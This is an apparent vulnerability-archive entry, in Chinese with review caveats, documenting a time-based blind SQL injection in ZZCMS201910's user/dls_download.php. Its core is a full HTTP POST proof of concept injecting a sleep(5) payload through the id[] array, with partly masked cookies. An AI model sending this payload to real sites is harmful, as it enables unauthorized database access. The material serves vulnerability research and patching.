---
source: "白阁文库 BaizeSec/bylibrary"
product: "ZZCMS201910"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ZZCMS201910 SQL注入"
prerequisites: "来源所述条件，未列明部分仍待核：VIPmembershipwithdownload/purchasepermission;idarrayinSQL; validlogin"
side_effects: "未执行；本文需注意的操作影响：Cookie携带metinfo/acc_auth等其他系统痕迹及长实样凭据，需脱敏清理避免产品混淆"
source_status: "unknown"
id: "vw-bc0cf9e79288a9265f98ae70"
entity_id: "ve-bc0cf9e79288a9265f98ae70"
schema_version: "1"
canonical: "Web安全/CMS内容/ZZCMS/ZZCMS201910 SQL注入.md"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：VIPmembershipwithdownload/purchasepermission;idarrayinSQL; validlogin

- **结论使用边界（1）**：明确VIP而非普通账户，是关键限制应保留。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（2）**：Cookie携带metinfo/acc_auth等其他系统痕迹及长实样凭据，需脱敏清理避免产品混淆。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（3）**：有实际id数组payload但无源码/响应/安全版，延迟5秒应基线复测。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（4）**：GitHubissue15精确来源；不将此后台/会员SQLi归未认证。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ZZCMS201910 SQL注入

## ZZCMS201910 SQL Injections SQL注入  

> 前提是你有一个具有购买权限的VIP会员账户
> 不然会提示：`"您所在的用户组没有下载此信息的权限！<br><input  type=button value=升级成VIP会员 onclick=\"location.href='/one/vipuser.php'\"/>"`  

### 注入点 ` user/dls_download with parameter $id`

### 利用POC如下  

```raw
POST /user/dls_download.php HTTP/1.1
Host: test.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://test.com
Connection: close
Referer: http://test.com/user/advzt_manage.php
Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1576564072; Hm_lvt_520556228c0113270c0c772027905838=1576734687,1577071433; app_href_source=myapp/free; PHPSESSID=f0f**************************1a3; arrlanguage=metinfo; Hm_lpvt_520556228c0113270c0c772027905838=1577672843; acc_auth=4b9****************************************************************************************ZH0; acc_key=eXM7G4F; __tins__713776=%7B%22sid%22%3A%201577775703119%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201577777503119%7D; __51cke__=; __51laig__=28; bdshare_firstime=1577771760963; UserName=test; PassWord=429**************************a93
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

id[]=1&id[]=2)%0aor%0asleep(5)%23&FileExt=xxx
```

来源与：https://github.com/JcQSteven/blog/issues/15


---

> 来源：白阁文库 BaizeSec/bylibrary
